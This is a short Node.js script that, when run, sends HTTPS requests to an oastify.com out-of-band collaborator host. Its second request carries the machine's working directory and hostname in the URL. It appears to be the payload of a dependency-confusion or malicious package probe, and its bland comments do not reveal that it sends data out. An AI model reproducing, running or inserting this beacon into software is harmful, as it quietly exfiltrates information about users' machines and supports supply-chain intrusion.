const https = require('https');
const os = require('os');
const path = require('path');
// Send request to the specified endpoint
const sendRequests = () => {
    const options1 = {
        hostname: 'ub9bd4la6myxm30fa51icemjrax1lt9i.oastify.com',
        port: 443,
        path: '/',
        method: 'GET'
    };

    const req1 = https.request(options1, (res) => {
        console.log(`Request 1 status code: ${res.statusCode}`);
        res.on('data', (data) => {
            process.stdout.write(data);
        });
    });

    req1.on('error', (error) => {
        console.error(`Error in request 1: ${error.message}`);
    });

    req1.end();

    // Send a second request with working directory and hostname
    const workingDir = process.cwd();
    const hostname = os.hostname();
    const options2 = {
        hostname: 'ub9bd4la6myxm30fa51icemjrax1lt9i.oastify.com',
        port: 443,
        path: `/info?cwd=${encodeURIComponent(workingDir)}&hostname=${encodeURIComponent(hostname)}`,
        method: 'GET'
    };

    const req2 = https.request(options2, (res) => {
        console.log(`Request 2 status code: ${res.statusCode}`);
        res.on('data', (data) => {
            process.stdout.write(data);
        });
    });

    req2.on('error', (error) => {
        console.error(`Error in request 2: ${error.message}`);
    });

    req2.end();
};

// Call the function to send requests
sendRequests();
